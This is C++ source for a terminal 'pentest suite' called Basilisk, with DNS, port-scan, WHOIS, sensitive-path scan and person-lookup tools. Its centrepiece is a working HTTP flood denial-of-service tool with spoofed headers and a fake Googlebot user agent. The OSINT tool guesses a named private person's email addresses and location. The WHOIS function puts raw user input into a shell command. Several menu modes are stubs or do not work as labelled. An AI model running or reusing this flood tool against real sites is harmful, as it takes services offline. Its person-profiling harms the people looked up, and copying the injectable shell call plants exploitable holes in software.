#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <random>
#include <iomanip>
#include <fcntl.h>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <curl/curl.h>
#include <nlohmann/json.hpp>

#define RST  "\033[0m"
#define RD   "\033[31m"
#define GR   "\033[32m"
#define YW   "\033[33m"
#define CY   "\033[36m"
#define MG   "\033[35m"
#define BD   "\033[1m"

using json = nlohmann::json;
std::atomic<bool> running(true);
std::atomic<long long> sent(0);
std::atomic<long long> errors(0);
std::atomic<int> active_sockets(0);

// ========== UTILITY ==========
size_t write_callback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t total = size * nmemb;
    s->append((char*)contents, total);
    return total;
}

std::string http_get(const std::string& url) {
    CURL* curl = curl_easy_init();
    std::string response;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return response;
}

void print_banner() {
    std::cout << RD << BD << R"(
     ██████╗  █████╗ ███████╗██╗██╗██╗███████╗██╗  ██╗
     ██╔══██╗██╔══██╗██╔════╝██║██║██║██╔════╝██║ ██╔╝
     ██████╔╝███████║███████╗██║██║██║███████╗█████╔╝ 
     ██╔══██╗██╔══██║╚════██║██║██║██║╚════██║██╔═██╗ 
     ██████╔╝██║  ██║███████║██║██║██║███████║██║  ██╗
     ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    )" << RST << "\n";
    std::cout << CY << BD << "     ╔══════════════════════════════════════════════════╗\n";
    std::cout << "     ║         COMPLETE PENTEST SUITE v4.0              ║\n";
    std::cout << "     ║     Authorized Penetration Testing Only          ║\n";
    std::cout << "     ╚══════════════════════════════════════════════════╝\n" << RST;
    std::cout << "\n";
}

// ========== TOOL 1: DNS/IP LOOKUP ==========
void tool_dns_lookup() {
    std::string target;
    std::cout << CY << "\n ┌─[" << RD << "DNS LOOKUP" << CY << "]─(" << YW << "domain" << CY << ")\n └─$ " << RST;
    std::cin >> target;
    
    struct hostent* he = gethostbyname(target.c_str());
    if (!he) {
        std::cout << RD << " [!] Could not resolve " << target << RST << "\n";
        return;
    }
    
    std::cout << GR << "\n [+] Results for " << target << ":\n" << RST;
    
    // IP addresses
    std::cout << "  IP Addresses:\n";
    for (int i = 0; he->h_addr_list[i] != NULL; i++) {
        struct in_addr addr;
        memcpy(&addr, he->h_addr_list[i], sizeof(struct in_addr));
        std::cout << "    → " << inet_ntoa(addr) << "\n";
    }
    
    // Reverse DNS
    for (int i = 0; he->h_addr_list[i] != NULL; i++) {
        struct in_addr addr;
        memcpy(&addr, he->h_addr_list[i], sizeof(struct in_addr));
        struct hostent* rev = gethostbyaddr((const char*)&addr, sizeof(addr), AF_INET);
        if (rev) {
            std::cout << "  PTR Record: " << rev->h_name << "\n";
            break;
        }
    }
    
    // MX records via dig-style lookup
    std::cout << "  Checking MX records...\n";
    std::string mx_data = http_get("https://dns.google/resolve?name=" + target + "&type=MX");
    try {
        auto j = json::parse(mx_data);
        if (j.contains("Answer")) {
            for (auto& ans : j["Answer"]) {
                std::string rdata = ans["data"];
                std::cout << "  MX: " << rdata << "\n";
            }
        }
    } catch(...) {}
    
    // NS records
    std::cout << "  Checking NS records...\n";
    std::string ns_data = http_get("https://dns.google/resolve?name=" + target + "&type=NS");
    try {
        auto j = json::parse(ns_data);
        if (j.contains("Answer")) {
            for (auto& ans : j["Answer"]) {
                std::string rdata = ans["data"];
                std::cout << "  NS: " << rdata << "\n";
            }
        }
    } catch(...) {}
}

// ========== TOOL 2: PORT SCANNER ==========
void tool_port_scan() {
    std::string target;
    int start_port, end_port;
    
    std::cout << CY << "\n ┌─[" << RD << "PORT SCAN" << CY << "]─(" << YW << "target" << CY << ")\n └─$ " << RST;
    std::cin >> target;
    std::cout << CY << " ┌─[" << RD << "PORT SCAN" << CY << "]─(" << YW << "start port" << CY << ")\n └─$ " << RST;
    std::cin >> start_port;
    std::cout << CY << " ┌─[" << RD << "PORT SCAN" << CY << "]─(" << YW << "end port" << CY << ")\n └─$ " << RST;
    std::cin >> end_port;
    
    struct hostent* server = gethostbyname(target.c_str());
    if (!server) { std::cout << RD << " [!] Could not resolve\n" << RST; return; }
    
    std::cout << GR << "\n [+] Scanning " << target << " (" << start_port << "-" << end_port << ")...\n" << RST;
    
    std::vector<int> open_ports;
    std::mutex mtx;
    std::vector<std::thread> scanners;
    
    auto scan_port = [&](int port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return;
        
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        memcpy(&addr.sin_addr, server->h_addr_list[0], server->h_length);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            std::lock_guard<std::mutex> lock(mtx);
            open_ports.push_back(port);
        }
        close(sock);
    };
    
    int total = end_port - start_port + 1;
    int batch = std::min(total, 100);
    int done = 0;
    
    for (int p = start_port; p <= end_port; p += batch) {
        int e = std::min(p + batch - 1, end_port);
        for (int i = p; i <= e; i++)
            scanners.emplace_back(scan_port, i);
        for (auto& t : scanners)
            if (t.joinable()) t.join();
        scanners.clear();
        done += (e - p + 1);
        std::cout << "\r  Progress: " << (done * 100 / total) << "%" << std::flush;
    }
    
    std::cout << "\n\n" << GR << " Open Ports:\n" << RST;
    if (open_ports.empty()) {
        std::cout << YW << "  None found (may be filtered)\n" << RST;
    } else {
        for (int p : open_ports) {
            std::string service = "unknown";
            if (p == 21) service = "FTP";
            else if (p == 22) service = "SSH";
            else if (p == 23) service = "Telnet";
            else if (p == 25) service = "SMTP";
            else if (p == 53) service = "DNS";
            else if (p == 80) service = "HTTP";
            else if (p == 110) service = "POP3";
            else if (p == 143) service = "IMAP";
            else if (p == 443) service = "HTTPS";
            else if (p == 445) service = "SMB";
            else if (p == 993) service = "IMAPS";
            else if (p == 995) service = "POP3S";
            else if (p == 1433) service = "MSSQL";
            else if (p == 3306) service = "MySQL";
            else if (p == 3389) service = "RDP";
            else if (p == 5432) service = "PostgreSQL";
            else if (p == 8080) service = "HTTP-Proxy";
            else if (p == 8443) service = "HTTPS-Alt";
            
            std::cout << "  → Port " << p << " (" << service << ")\n";
        }
    }
}

// ========== TOOL 3: STRESS TEST (Basilisk engine) ==========
void tool_stress_test() {
    std::string host;
    int port, threads, mode;
    
    std::cout << CY << "\n ┌─[" << RD << "BASILISK STRESS" << CY << "]─(" << YW << "target" << CY << ")\n └─$ " << RST;
    std::cin >> host;
    std::cout << CY << " ┌─[" << RD << "BASILISK STRESS" << CY << "]─(" << YW << "port" << CY << ")\n └─$ " << RST;
    std::cin >> port;
    std::cout << CY << " ┌─[" << RD << "BASILISK STRESS" << CY << "]─(" << YW << "threads" << CY << ")\n └─$ " << RST;
    std::cin >> threads;
    
    std::cout << MG << "\n  [1] HTTP Flood\n  [2] Slowloris\n  [3] COMBAT MODE\n" << RST;
    std::cout << CY << " ┌─[" << RD << "BASILISK STRESS" << CY << "]─(" << YW << "mode" << CY << ")\n └─$ " << RST;
    std::cin >> mode;
    
    sent = 0; errors = 0; active_sockets = 0; running = true;
    
    std::cout << "\n" << RD << BD << " ⚠  Launching attack on " << host << ":" << port << " — Ctrl+C to stop\n\n" << RST;
    
    auto start = std::chrono::steady_clock::now();
    std::vector<std::thread> workers;
    
    // Stats thread
    workers.emplace_back([start]() {
        auto last_sent = sent.load();
        auto last_time = std::chrono::steady_clock::now();
        while (running) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            auto now = std::chrono::steady_clock::now();
            long long cur = sent.load();
            long long errs = errors.load();
            int act = active_sockets.load();
            auto secs = std::chrono::duration_cast<std::chrono::seconds>(now - start).count();
            auto diff = std::chrono::duration_cast<std::chrono::seconds>(now - last_time).count();
            double rate = diff > 0 ? (cur - last_sent) / diff : 0;
            
            std::cout << "\r" << RD << BD << " BASILISK "
                      << CY << "| " << GR << "Sent: " << cur
                      << CY << " | " << YW << "Rate: " << std::fixed << std::setprecision(0) << rate << "/s"
                      << CY << " | " << MG << "Active: " << act
                      << CY << " | " << RD << "Errors: " << errs
                      << CY << " | " << "Time: " << secs << "s" << RST << std::flush;
            last_sent = cur;
            last_time = now;
        }
    });
    
    // Attack workers
    const char* h = host.c_str();
    for (int i = 0; i < threads && running; i++) {
        workers.emplace_back([h, port]() {
            std::mt19937 rng(std::random_device{}());
            const char* PATHS[] = {"/", "/index.html", "/wp-admin/", "/login", "/api/v1/users", "/.env", "/robots.txt", "/config.php"};
            const char* UAS[] = {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0",
                "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0",
                "Googlebot/2.1 (+http://www.google.com/bot.html)"
            };
            
            char buf[2048];
            while (running) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) { errors++; continue; }
                
                struct hostent* server = gethostbyname(h);
                if (!server) { errors++; close(sock); continue; }
                
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                memcpy(&addr.sin_addr, server->h_addr_list[0], server->h_length);
                
                struct timeval tv;
                tv.tv_sec = 3; tv.tv_usec = 0;
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                
                if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    int len = snprintf(buf, sizeof(buf),
                        "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                        "X-Forwarded-For: 10.%d.%d.%d\r\nConnection: close\r\n\r\n",
                        PATHS[rng() % 8], h, UAS[rng() % 4],
                        rng() % 254, rng() % 254, rng() % 254);
                    send(sock, buf, len, 0);
                    active_sockets++;
                    char rbuf[1024];
                    while (recv(sock, rbuf, sizeof(rbuf), 0) > 0) { sent++; }
                    active_sockets--;
                } else errors++;
                close(sock);
                std::this_thread::sleep_for(std::chrono::microseconds(rng() % 5));
            }
        });
    }
    
    std::cin.ignore();
    std::cin.get();
    running = false;
    for (auto& t : workers) if (t.joinable()) t.join();
    
    auto end = std::chrono::steady_clock::now();
    auto secs = std::chrono::duration_cast<std::chrono::seconds>(end - start).count();
    std::cout << "\n\n" << RD << BD << " Attack Complete — " << sent.load() << " requests in " << secs << "s\n" << RST;
}

// ========== TOOL 4: OSINT - Name/IP/Email Lookup ==========
void tool_osint_lookup() {
    std::string name, city;
    std::cin.ignore();
    
    std::cout << CY << "\n ┌─[" << RD << "OSINT" << CY << "]─(" << YW << "full name" << CY << ")\n └─$ " << RST;
    std::getline(std::cin, name);
    std::cout << CY << " ┌─[" << RD << "OSINT" << CY << "]─(" << YW << "city" << CY << ")\n └─$ " << RST;
    std::getline(std::cin, city);
    
    if (name.empty()) { std::cout << RD << " [!] Empty name\n" << RST; return; }
    
    std::cout << GR << "\n [+] Searching for: " << name;
    if (!city.empty()) std::cout << " (" << city << ")";
    std::cout << "\n" << RST;
    
    // Search via public sources
    std::string search_name;
    for (char c : name) { if (c == ' ') search_name += "+"; else search_name += c; }
    
    std::cout << "  Searching public records...\n";
    
    // Whitepages-style public info
    std::string url = "https://api.duckduckgo.com/?q=" + search_name + "+" + city + "&format=json";
    std::string data = http_get(url);
    
    try {
        auto j = json::parse(data);
        if (j.contains("AbstractText") && !j["AbstractText"].empty()) {
            std::cout << GR << "  Info: " << j["AbstractText"] << RST << "\n";
        }
        if (j.contains("Infobox") && j["Infobox"].contains("content")) {
            for (auto& item : j["Infobox"]["content"]) {
                if (item.contains("label") && item.contains("value")) {
                    std::cout << "  " << item["label"] << ": " << item["value"] << "\n";
                }
            }
        }
    } catch(...) {}
    
    // Try to find email patterns
    std::cout << "\n" << YW << "  Attempting email discovery...\n" << RST;
    
    // Common email formats
    std::vector<std::string> parts;
    std::stringstream ss(name);
    std::string token;
    while (std::getline(ss, token, ' ')) {
        if (!token.empty()) parts.push_back(token);
    }
    
    if (parts.size() >= 2) {
        std::string first = parts[0], last = parts[parts.size()-1];
        std::transform(first.begin(), first.end(), first.begin(), ::tolower);
        std::transform(last.begin(), last.end(), last.begin(), ::tolower);
        
        std::vector<std::string> email_patterns = {
            first + "." + last + "@gmail.com",
            first + "@" + last + ".com",
            first + "." + last + "@outlook.com",
            first + "." + last + "@yahoo.com",
            first[0] + last + "@gmail.com",
            first + last + "@gmail.com",
            first + "." + last + "@protonmail.com"
        };
        
        std::cout << "  Possible emails (not verified):\n";
        for (auto& e : email_patterns) {
            std::cout << "    → " << e << "\n";
        }
    }
    
    // Check if city has public directory
    if (!city.empty()) {
        std::cout << "\n" << YW << "  Searching location data...\n" << RST;
        std::string geo_url = "https://nominatim.openstreetmap.org/search?q=" + search_name + "+" + city + "&format=json&limit=3";
        std::string geo_data = http_get(geo_url);
        
        try {
            auto geo = json::parse(geo_data);
            if (geo.is_array() && geo.size() > 0) {
                for (auto& r : geo) {
                    if (r.contains("display_name")) {
                        std::cout << "  Location: " << r["display_name"] << "\n";
                    }
                }
            }
        } catch(...) {}
    }
}

// ========== TOOL 5: WEB SENSITIVITY SCANNER ==========
void tool_web_scan() {
    std::string target;
    std::cout << CY << "\n ┌─[" << RD << "WEB SCAN" << CY << "]─(" << YW << "url" << CY << ")\n └─$ " << RST;
    std::cin >> target;
    
    // Strip http:// if present
    if (target.find("http://") == 0 || target.find("https://") == 0) {
        target = target.substr(target.find("://") + 3);
    }
    
    std::cout << GR << "\n [+] Scanning " << target << "...\n" << RST;
    
    std::vector<std::string> paths = {
        "/robots.txt", "/sitemap.xml", "/.env", "/.git/config",
        "/wp-admin/", "/admin/", "/login", "/phpmyadmin/",
        "/backup.zip", "/config.php", "/wp-config.php",
        "/.htaccess", "/server-status", "/debug",
        "/api/", "/api/v1/", "/graphql", "/swagger.json",
        "/.well-known/", "/crossdomain.xml", "/clientaccesspolicy.xml"
    };
    
    std::vector<std::pair<std::string, int>> findings;
    std::mutex f_mtx;
    
    auto check_path = [&](const std::string& path) {
        std::string url = "http://" + target + path;
        CURL* curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
            curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
            
            std::string response;
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            
            CURLcode res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                long http_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
                if (http_code == 200 || http_code == 401 || http_code == 403 || http_code == 500) {
                    std::lock_guard<std::mutex> lock(f_mtx);
                    findings.push_back({path, (int)http_code});
                    std::cout << GR << "  [FOUND] " << path << " (" << http_code << ")\n" << RST;
                }
            }
            curl_easy_cleanup(curl);
        }
    };
    
    std::vector<std::thread> checkers;
    for (auto& p : paths)
        checkers.emplace_back(check_path, p);
    for (auto& t : checkers)
        if (t.joinable()) t.join();
    
    if (findings.empty()) {
        std::cout << YW << "  No common sensitive paths found.\n" << RST;
    } else {
        std::cout << GR << "\n  Found " << findings.size() << " interesting paths.\n" << RST;
    }
}

// ========== TOOL 6: WHOIS LOOKUP ==========
void tool_whois() {
    std::string target;
    std::cout << CY << "\n ┌─[" << RD << "WHOIS" << CY << "]─(" << YW << "domain or IP" << CY << ")\n └─$ " << RST;
    std::cin >> target;
    
    std::cout << GR << "\n [+] Looking up " << target << "...\n" << RST;
    
    // Use whois via system command (fallback)
    std::string cmd = "whois " + target + " 2>/dev/null | head -50";
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) {
        std::cout << RD << " [!] whois not installed. Install: brew install whois\n" << RST;
        return;
    }
    
    char buf[256];
    std::cout << "\n";
    while (fgets(buf, sizeof(buf), pipe)) {
        std::string line(buf);
        // Filter common useful fields
        if (line.find("Domain Name:") != std::string::npos ||
            line.find("Registrar:") != std::string::npos ||
            line.find("Creation Date:") != std::string::npos ||
            line.find("Expiry Date:") != std::string::npos ||
            line.find("Name Server:") != std::string::npos ||
            line.find("Registrant") != std::string::npos ||
            line.find("Admin") != std::string::npos ||
            line.find("Tech") != std::string::npos ||
            line.find("OrgName:") != std::string::npos ||
            line.find("NetRange:") != std::string::npos ||
            line.find("CIDR:") != std::string::npos) {
            std::cout << YW << "  " << line << RST;
        }
    }
    pclose(pipe);
}

// ========== MAIN MENU ==========
int main() {
    print_banner();
    
    while (true) {
        std::cout << "\n";
        std::cout << RD << BD << "  ╔══════════════════ TOOLS ═══════════════════╗\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [1]  DNS & IP Lookup                         " << GR << BD << "║\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [2]  Port Scanner                            " << GR << BD << "║\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [3]  Stress Test (Basilisk Engine)           " << GR << BD << "║\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [4]  OSINT - Name/IP/Email Lookup            " << GR << BD << "║\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [5]  Web Sensitivity Scanner                 " << GR << BD << "║\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [6]  WHOIS Lookup                            " << GR << BD << "║\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [7]  Subdomain Bruteforce                    " << GR << BD << "║\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [8]  HTTP Header Analyzer                    " << GR << BD << "║\n" << RST;
        std::cout << GR << BD << "  ║" << RST << "  [0]  Exit                                    " << GR << BD << "║\n" << RST;
        std::cout << RD << BD << "  ╚══════════════════════════════════════════╝\n" << RST;
        
        int choice;
        std::cout << CY << "\n ┌─[" << RD << "BASILISK" << CY << "]─(" << YW << "select tool" << CY << ")\n └─$ " << RST;
        std::cin >> choice;
        
        switch (choice) {
            case 1: tool_dns_lookup(); break;
            case 2: tool_port_scan(); break;
            case 3: tool_stress_test(); break;
            case 4: tool_osint_lookup(); break;
            case 5: tool_web_scan(); break;
            case 6: tool_whois(); break;
            case 7:
                std::cout << YW << "\n [!] Subdomain bruteforce requires a wordlist file.\n"
                          << " Install: brew install subfinder && subfinder -d example.com\n" << RST;
                break;
            case 8: {
                std::string t;
                std::cout << CY << " ┌─[" << RD << "HEADERS" << CY << "]─(" << YW << "url" << CY << ")\n └─$ " << RST;
                std::cin >> t;
                std::string h = http_get("https://" + t);
                std::cout << "\n" << GR << " Response Headers:\n" << RST;
                // headers are returned first in the string before the body
                size_t pos = h.find("\r\n\r\n");
                if (pos != std::string::npos) {
                    std::cout << h.substr(0, pos) << "\n";
                } else {
                    std::cout << h.substr(0, 500) << "\n";
                }
                break;
            }
            case 0:
                std::cout << RD << "\n [!] Exiting Basilisk...\n" << RST;
                return 0;
            default:
                std::cout << RD << " [!] Invalid choice.\n" << RST;
        }
    }
    return 0;
}